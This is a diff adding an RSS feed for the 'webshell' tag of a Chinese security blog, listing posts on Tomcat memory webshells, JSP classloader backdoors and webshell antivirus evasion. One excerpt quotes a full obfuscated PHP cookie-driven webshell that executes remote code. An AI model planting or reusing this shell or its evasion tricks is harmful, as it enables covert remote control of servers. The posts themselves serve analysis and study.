@@ -1,0 +1,50 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>webshell - 标签 - </title>
+        <link>https://yzddmr6.com/tags/webshell/</link>
+        <description>webshell - 标签 - </description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>yzddMr6@gmail.com (yzddMr6)</managingEditor>
+            <webMaster>yzddMr6@gmail.com (yzddMr6)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Tue, 14 Jul 2020 20:28:03 &#43;0000</lastBuildDate><atom:link href="https://yzddmr6.com/tags/webshell/" rel="self" type="application/rss+xml" /><item>
+    <title>Tomcat内存Webshell解析之Filter型</title>
+    <link>https://yzddmr6.com/posts/tomcat-memory-webshell-filter/</link>
+    <pubDate>Tue, 14 Jul 2020 20:28:03 &#43;0000</pubDate><author>
+        <name>yzddMr6</name>
+    </author><guid>https://yzddmr6.com/posts/tomcat-memory-webshell-filter/</guid>
+    <description><![CDATA[1 前言最近学习了一下基于Tomcat的内存Webshell https://scriptboy.cn/p/tomcat-filter-inject/ https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA https://xz.aliyun.com/t/7388 2 Filter生效流程首先我们看下正常的一个filter的注册流程是什么。 首]]></description>
+</item><item>
+    <title>[知识星球]JSP类加载后门</title>
+    <link>https://yzddmr6.com/posts/jsp-classload-backdoor/</link>
+    <pubDate>Wed, 26 Feb 2020 12:59:16 &#43;0000</pubDate><author>
+        <name>yzddMr6</name>
+    </author><guid>https://yzddmr6.com/posts/jsp-classload-backdoor/</guid>
+    <description><![CDATA[1 前言在上篇文章的最后我提到了可以用类加载实现一个类似php回调函数的后门，在这篇文章里实现了一下，供大家借鉴参考。 2 正文 2.1 基本原理相当于一]]></description>
+</item><item>
+    <title>WebShell免杀之JSP</title>
+    <link>https://yzddmr6.com/posts/webshell-bypass-jsp/</link>
+    <pubDate>Sat, 01 Feb 2020 18:44:42 &#43;0000</pubDate><author>
+        <name>yzddMr6</name>
+    </author><guid>https://yzddmr6.com/posts/webshell-bypass-jsp/</guid>
+    <description><![CDATA[1 前言其他类型的webshell容易免杀的一个主要原因是有eval函数，能够把我们的加密几层后的payload进行解密然后用eval执行，从]]></description>
+</item><item>
+    <title>某Shell分析以及自己的一些想法</title>
+    <link>https://yzddmr6.com/posts/an-interesting-shell/</link>
+    <pubDate>Thu, 28 Nov 2019 15:24:29 &#43;0000</pubDate><author>
+        <name>yzddMr6</name>
+    </author><guid>https://yzddmr6.com/posts/an-interesting-shell/</guid>
+    <description><![CDATA[1 前言 1 2 3 &lt;?php $p=$_COOKIE;(count($p)==23&amp;&amp;in_array(gettype($p).count($p),$p))?(($p[59]=$p[59].$p[72])&amp;&amp;($p[91]=$p[59]($p[91]))&amp;&amp;($p=$p[91]($p[90],$p[59]($p[31])))&amp;&amp;$p()):$p; ?&gt; 星球里有很多同学想让我对这个shell写一篇解析，看了下确实比较有意思，并且顺便也想讲一些自己的想法。 2 语法分析比较复杂的]]></description>
+</item><item>
+    <title>[知识星球]WebShell免杀之PHP</title>
+    <link>https://yzddmr6.com/posts/webshell-bypass-php/</link>
+    <pubDate>Fri, 11 Oct 2019 10:09:42 &#43;0000</pubDate><author>
+        <name>yzddMr6</name>
+    </author><guid>https://yzddmr6.com/posts/webshell-bypass-php/</guid>
+    <description><![CDATA[1 前言php的免杀可以说是已经被说烂了。 由于php特别灵活，所产生的变种也是层出不穷 但是与此同时，D盾等waf的检测也格外严格。 有时候写的比]]></description>
+</item><item>
+    <title>[知识星球]WebShell免杀之ASP</title>
+    <link>https://yzddmr6.com/posts/webshell-bypass-asp/</link>
+    <pubDate>Wed, 02 Oct 2019 13:41:43 &#43;0000</pubDate><author>
+        <name>yzddMr6</name>
+    </author><guid>https://yzddmr6.com/posts/webshell-bypass-asp/</guid>
+    <description><![CDATA[1 前言授人以鱼不如授人以渔 所以准备给星球写一份免杀的系列文章 让大家自己掌握免杀的一些技巧跟方法，这样即使脚本失效也不用每次都催着我更新了 正好]]></description>
+</item></channel>
+</rss>
